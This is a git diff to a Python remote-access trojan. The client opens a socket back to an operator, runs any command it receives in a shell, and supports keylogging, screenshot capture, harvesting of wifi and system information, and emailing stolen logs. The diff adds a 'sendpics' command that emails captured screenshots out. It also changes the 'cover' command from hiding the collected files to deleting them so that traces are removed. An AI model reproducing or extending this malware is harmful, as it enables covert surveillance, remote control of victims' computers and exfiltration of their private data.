@@ -10,7 +10,7 @@ from modules.menu import *
 from modules.screenshots import *
 from modules.wifi import *
 from modules.system_info import *
-from modules.hide_files import *
+from modules.cover import *
 import socket 
 import subprocess, os
 from socket import *
@@ -39,7 +39,8 @@ def transfer(s,path):
 
 
 
-def main():
+def control_shell():
+    
     while 1:
         s = socket(AF_INET, SOCK_STREAM)
         while 1:
@@ -67,7 +68,7 @@ def main():
                         
                     elif ((command != "exit") and ("cd " not in command) and (command != "begin") and (command != "keylog") and (command != "capture")\
                           and (command != "openwins") and (command != "ip") and (command != "history")\
-                          and (command != "sendlogs") and (command != "systeminfo") and (command != "wifi")\
+                          and (command != "sendlogs") and (command != "sendpics") and (command != "systeminfo") and (command != "wifi")\
                           and (command != "cover")):
                         
                         comm = subprocess.Popen(str(command), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
@@ -123,6 +124,13 @@ def main():
                          send_new_email(folder_path)
                          s.send("[*] Check the mail for the logs..........................\n")
                          s.send("\n\n")
+                        
+                    # send the pictures via email
+                    elif (command.strip() == 'sendpics'):
+                         s.send("[*] Starting to send the picture........................... \n\n")
+                         send_new_email(screen_shots)
+                         s.send("[*] Check the e-mail for the pictures..........................\n")
+                         s.send("\n\n")
 
                     # capture screenshots
                     elif (command.strip() == 'capture'):
@@ -146,8 +154,8 @@ def main():
 
                     elif (command.strip() == 'cover'):
                         s.send("\n\n")
-                        s.send("[*] Getting ready to hide and cover .................................... \n\n")
-                        hide_file(folder_path)
+                        s.send("[*] Getting ready to delete the files .................................... \n\n")
+                        remove_folder(folder_path)
                     
             except:
                   print "[INFO] Connection Closed"
@@ -155,7 +163,14 @@ def main():
                   break
                                   
                 
+
+
         
          
+
+def main():
+
+    control_shell()
+
 
 main()
